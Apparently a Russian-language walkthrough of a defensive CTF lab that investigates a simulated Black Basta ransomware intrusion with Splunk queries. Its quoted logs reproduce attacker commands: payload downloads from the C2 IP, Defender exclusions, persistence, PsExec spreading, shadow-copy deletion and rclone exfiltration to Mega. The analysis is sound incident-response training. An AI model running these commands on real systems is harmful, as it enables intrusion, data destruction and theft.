# Black Basta Lab
https://cyberdefenders.org/blueteam-ctf-challenges/black-basta/ (Splunk/CyberChef)

---

**Сценарий:**

Сотрудник финансового отдела компании **OrionTech** получил письмо от якобы доверенного поставщика. Вложение в письме это ZIP-архив, содержащий файл, визуально похожий на документ. После открытия файла была запущена цепочка действий, которая привела к компрометации рабочей станции, перемещению злоумышленника по сети, краже данных и запуску шифровальщика Black Basta.

---

### Этап 1: Initial Access

#### Вопрос 1. Сотрудник скачал ZIP-архив, содержащий вредоносный Excel-файл. Какой полный URL использовался для загрузки этого файла?

**Ответ:**`http://54[.]93[.]105[.]22/Financial%20Records.zip`
(при поиске использовала событие Sysmon EventID=15, которое фиксирует маркер зоны безопасности `Zone.Identifier` для файлов, которые скачанны из интернета)

<img width="600" height="250" alt="recor" src="https://github.com/user-attachments/assets/c6a12261-874f-4c22-b0bb-7cba40785751" />


#### Вопрос 2.После распаковки архива сотрудник открыл Excel файл, который запустил вредоносный макрос. Какой SHA256 у этого файла?

**Ответ:**`030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15` 
(после обнаружения zip архива искала файлы, созданные или запущенные после распаковки. Фильтровала по расширению `.xl*` и совмещала это с активностью пользователя `knixon`, который фигурировал в логах прошлого вопроса)

---

### Этап 2: Execution
#### Вопрос 3. После запуска вредоносного Excel-файла был создан дополнительный файл для продолжения атаки. Как называется этот файл?

**Ответ:**`F6w1S48.vbs`
(искала по событиям создания файла EventID=11 + фильтрация по процессу `powershell.exe` и пользователю `knixon`)
Легитимные скрипты редко генерируют исполняемые файлы во временных директориях.

**Фрагмент лога:**
```xml
<Data Name='TargetFilename'>C:\Users\knixon\AppData\Local\Temp\F6w1S48.vbs</Data>
<Data Name='ProcessId'>8684</Data>
<Data Name='Image'>C:\Windows\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
```


#### Вопрос 4. Какой полный путь к файлу, созданному после открытия Excel-документа?

**Ответ:**`C:\Users\knixon\AppData\Local\Temp\F6w1S48.vbs` 
(ответ содержится в том же событии EventID=11, что и в предыдущем вопросе. В поле TargetFilename)

#### Вопрос 5. На раннем этапе выполнения атаки в цепочку была добавлена DLL. Как называется эта библиотека?

**Ответ:**`WindowsUpdaterFX.dll`
(зная, что F6w1S48.vbs является родительским процессом, искала EventID=1 с фильтрацией по ParentImage=wscript.exe)

**Фрагмент лога:**
```xml
<Data Name='CommandLine'>"C:\Windows\System32\regsvr32.exe" /s C:\Users\knixon\AppData\Local\Temp\WindowsUpdaterFX.dll</Data>
<Data Name='ParentCommandLine'>"C:\Windows\System32\WScript.exe" "C:\Users\knixon\AppData\Local\Temp\F6w1S48.vbs"</Data>
```
(вообще, использование `regsvr32.exe` для загрузки DLL - это пример использования хакерами легитимного системного инструмента (LOLBin))

#### Вопрос 6. Какой Process ID у процесса, который запустил вредоносную DLL?

**Ответ:** `8592`
(PID указан в поле ProcessId того же события, где была найдена загрузка DLL)

---

### Этап 3: Persistence & Defense Evasion

#### Вопрос 7. Для сохранения доступа злоумышленник создал запланированную задачу, которая выполняется при входе в систему. Как называется эта задача?

**Ответ:** `WiindowsUpdate`
(поиск по событиям создания задач + пользователь knixon)

**Фрагмент лога:**
```xml
<Data Name='CommandLine'>schtasks /Create /RU "NT AUTHORITY\SYSTEM" /SC ONLOGON /TN "WiindowsUpdate" /TR "C:\Windows\System32\regsvr32.exe /s %%localappdata%%\Temp\WindowsUpdaterFX.dll"</Data>
<Data Name='RuleName'>technique_id=T1053.005,technique_name=Scheduled Task/Job</Data>
```
Тут мы видим явный typosquatting в названии задачи.

#### Вопрос 8. В рамках закрепления был создан ключ реестра для запуска скрипта при входе пользователя. Какой полный ключ реестра был добавлен?

**Ответ:**`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater`
(нашла закодированную PowerShell команду в логах, декодировала base64 через CyberChef)

```powershell
$objShell = New-Object -ComObject WScript.Shell
$objShell.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater", "wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs", "REG_SZ")
```
Ключ Run в HKCU дает выполнение скрипта при каждом входе пользователя. 

<img width="700" height="350" alt="создание раздела реестра" src="https://github.com/user-attachments/assets/5684efe8-6a2a-4b02-bc81-4256097e039c" />


#### Вопрос 9. Для обхода детектирования злоумышленник исключил 3 директории из сканирования Windows Defender. Какие полные пути у этих директорий?

**Ответ:**  
`1. C:\ProgramData\Microsoft\ssh
2. %APPDATA%\Microsoft
3. %LOCALAPPDATA%\Temp`

(нашла несколько закодированных PowerShell команд. После декодирования обнаружила вызов Add-MpPreference -ExclusionPath)

Пример:
```powershell
Add-MpPreference -ExclusionPath "%LOCALAPPDATA%/Temp"
```
---

### Этап 4: Command & Control

#### Вопрос 10. Для установления связи с удалённым сервером на системе был размещён beacon-файл. Как называется этот файл?

**Ответ:** `Pancake.jpg.exe`
(продолжила декодирование PowerShell команд, найденных в логах) 

Обнаружила:
```powershell
Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe
```

#### Вопрос 11. Beacon использовался для связи с инфраструктурой управления злоумышленника (C2). Какой IP-адрес использовался для C2-коммуникации?

**Ответ:**`54[.]93[.]105[.]22`
(сопоставила процесс Pancake.jpg.exe с сетевыми событиями. Искала исходящие соединения от этого процесса)

---

### Этап 5: Lateral Movement & Discovery

#### Вопрос 12. Для перемещения по сети злоумышленник развернул инструмент удалённого выполнения команд. Какой инструмент использовался для запуска команд на других системах?

**Ответ:**`PsExec64.exe`
(искала по пользователю knixon + Pancake.jpg.exe в контексте удалённого выполнения + EventCode=1)

**Фрагмент команды:**
`PsExec64.exe \\financees.local -accepteula -s -c -f Pancake.jpg.exe`

(PsExec это легитимный инструмент Sysinternals и часто используемый в атаках, а флаги -c -f означают копирование и принудительный запуск файла на удалённой системе)

#### Вопрос 13. Устаревшая консольная утилита Windows использовалась для загрузки вредоносных файлов. Какой инструмент применялся для этой задачи?

**Ответ:**`bitsadmin` 
(искала PsExec64.exe + анализ командной строки в событиях создания процессов)

**Фрагмент команды:**
``
cmd.exe /C bitsadmin /transfer "d" https://raw[.]githubusercontent[.]com/davehardy20/sysinternals/refs/heads/master/PsExec64.exe C:\Users\knixon\AppData\Local\Temp\PsExec64.exe
``

#### Вопрос 14. Для загрузки файлов на DC01 злоумышленник использовал легитимный консольный инструмент. Какой инструмент применялся для загрузки файлов на эту машину?

**Ответ:** `curl`
(искала через фильтрацию событий по хосту DC01 и поиск команд загрузки)

**Фрагмент команды:**
``
cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\6as98v.exe" http://54[.]93[.]105[.]22/6as98v.exe
``

#### Вопрос 15. Злоумышленник просканировал внутреннюю сеть для поиска дополнительных целей. Какая полная команда была выполнена для сетевого обнаружения?

**Ответ:** `netscan.exe /hide /range:10.10.11.1-10.10.255.255 /auto:results.xml`
(искала по Product "Network Scanner" и пользователю FINANCEES\\knixon)

Тут мы видим сканирование диапазона с попыткой охватить всю подсеть и затем сохранение результатов в файл)

<img width="700" height="350" alt="netscan" src="https://github.com/user-attachments/assets/86d4b045-441d-4e6b-b539-cbd73daa2864" />


#### Вопрос 16. Для эксфильтрации данных с домен-контроллера использовалась привилегированная учётная запись домена. Какая учётная запись была скомпрометирована на DC01?

**Ответ:** `swhite`
(количество событий по пользователям на хосте `DC01`)
```spl
index=* host="DC01" 
| stats count by user 
| sort -count
```
В результате: пользователь `swhite` (помимо SYSTEM) имеет 714 событий.

---

### Этап 6: Impact

#### Вопрос 17. На завершающем этапе атаки была развернута полезная нагрузка шифровальщика для шифрования файлов в системе. Как называется файл, который запустил ransomware?

**Ответ:** `6as98v.exe`
(искала на хосте DC01 события создания файлов которые были инициированны процессом Pancake.jpg.exe)

**Фрагмент лога:**
```xml
<Data Name='Image'>C:\Windows\Pancake.jpg.exe</Data>
<Data Name='TargetFilename'>C:\Users\swhite\AppData\Local\Temp\6as98v.exe</Data>
<Data Name='User'>NT AUTHORITY\SYSTEM</Data>
```

#### Вопрос 18. Какой Process ID у процесса шифровальщика?

**Ответ:**`5792` 
(искала через фильтрацию всех событий, связанных с 6as98v.exe, и анализ поля ProcessId. Наиболее часто встречающийся PID -5792)

#### Вопрос 19. Шифровальщик выполнил команду для удаления теневых копий и предотвращения восстановления системы. Какая учётная запись выполнила эту команду?

**Ответ:** `NT AUTHORITY\SYSTEM`
(искала по ключевому слову `shadow` в логах)

**Фрагмент команды:**
```
C:\Windows\system32\cmd.exe /c C:\Windows\SysNative\vssadmin.exe delete shadows /all /quiet
```

**Фрагмент лога:**
```xml
<Data Name='CommandLine'>C:\Windows\system32\cmd.exe /c C:\Windows\SysNative\vssadmin.exe delete shadows /all /quiet</Data>
<Data Name='User'>NT AUTHORITY\SYSTEM</Data>
<Data Name='ParentImage'>C:\Users\swhite\AppData\Local\Temp\6as98v.exe</Data>
```
<img width="700" height="350" alt="теневые копии" src="https://github.com/user-attachments/assets/3848278f-8805-40bf-a346-4b2c81889c2c" />


#### Вопрос 20. Для блокировки восстановления системы злоумышленник выполнил команду удаления теневых копий. Какая системная утилита использовалась для этого действия?

**Ответ:** `vssadmin`
(ответ виден из предыдущего лога)
 
`vssadmin` это легитимная утилита управления теневыми копиями.

#### Вопрос 21. После успешного шифрования ransomware изменил затронутые файлы. Какое расширение добавлялось к зашифрованным файлам?

**Ответ:** `.basta`
(анализ) имён файлов, созданных или изменённых пользователем `swhite` в директории `Temp` на хосте `DC01`)

```spl
index=* host="DC01" *swhite* *TEMP*
| stats count by file_name
```

Среди множества знакомых файлов и расширений впервые встретила расширение `.basta`.

---

### Этап 7: Exfiltration

#### Вопрос 22. Для подготовки данных к эксфильтрации злоумышленник заархивировал конфиденциальную информацию в сжатый формат. Как называется сжатый файл?

**Ответ:** `data.zip`
(искала по форматам архивов)

**Фрагмент команды:**
```powershell
Compress-Archive -Path C:\clients -DestinationPath C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\data.zip -Force
```

#### Вопрос 23. Для передачи украденных данных злоумышленник использовал сторонний инструмент эксфильтрации. Какой инструмент применялся для передачи сжатого файла?

**Ответ:** `rclone`
(вообще ответ мы видим и по прошлому логу, но нашла еще и логи загрузки самого rclone) 

**Фрагмент команды:**
```
cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64.zip" https://downloads.rclone.org/v1.69.1/rclone-v1.69.1-windows-amd64.zip
```

#### Вопрос 24. Злоумышленник загрузил украденные данные в облачный сервис. Как называется облачная платформа, использованная для эксфильтрации?

**Ответ:** `mega`
(искала DNSзапросы от процесса rclone.exe)

**Фрагмент лога:**
```xml
<Data Name='QueryName'>g.api.mega.co.nz</Data>
<Data Name='QueryResults'>type: 5 lu.api.mega.co.nz;::ffff:66.203.125.15;...</Data>
<Data Name='Image'>C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\rclone.exe</Data>
```
